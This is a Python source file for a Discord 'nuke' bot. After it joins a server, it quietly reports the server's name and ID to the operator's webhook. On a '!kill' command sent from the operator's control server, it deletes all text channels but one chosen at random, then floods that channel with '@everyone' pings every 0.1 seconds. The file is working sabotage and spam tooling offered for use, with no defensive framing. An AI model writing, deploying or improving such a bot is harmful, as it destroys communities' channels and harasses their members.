import nextcord
import random
import requests
from nextcord.ext import commands, tasks

TOKEN = 'YOUR_NEW_BOT_TOKEN'  # Replace this with your bot's token
WEBHOOK_URL = 'YOUR_WEBHOOK_URL'  # Replace with a webhook URL from your server
GUILD_ID = 'YOUR_GUILD_ID'  # Your control server ID (where you send the kill command) It will not work unless you do the specified server

intents = nextcord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

keep_channel = None
target_guild = None  # Store the server where the bot joins

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")

@bot.event
async def on_guild_join(guild):
    global target_guild
    target_guild = guild
    print(f"Joined guild: {guild.name} (ID: {guild.id})")

    # Notify via webhook
    payload = {
        "content": f"🔔 Bot joined a new server:\n**{guild.name}** (ID: `{guild.id}`)"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Failed to send webhook: {e}")

@bot.command(name="kill")
async def kill(ctx):
    global keep_channel

    if ctx.guild.id != GUILD_ID:
        await ctx.send("❌ You are not authorized to run this command.")
        return

    if target_guild is None:
        await ctx.send("⚠️ Bot hasn't joined any target server yet.")
        return

    if len(target_guild.text_channels) <= 1:
        await ctx.send("⚠️ Not enough channels to delete.")
        return

    keep_channel = random.choice(target_guild.text_channels)
    await ctx.send(f"✅ Keeping channel: **#{keep_channel.name}**. Deleting others...")

    for channel in target_guild.text_channels:
        if channel != keep_channel:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Error deleting {channel.name}: {e}")

    await keep_channel.send("@everyone")
    spam_everyone.start()

@bot.command(name="stop")
async def stop(ctx):
    spam_everyone.stop()
    await ctx.send("🛑 Stopped spamming.")

@tasks.loop(seconds=0.1)  # Adjust the interval to control spam speed
async def spam_everyone():
    if keep_channel:
        try:
            await keep_channel.send("@everyone")
        except Exception as e:
            print(f"Error sending spam: {e}")

bot.run(TOKEN)
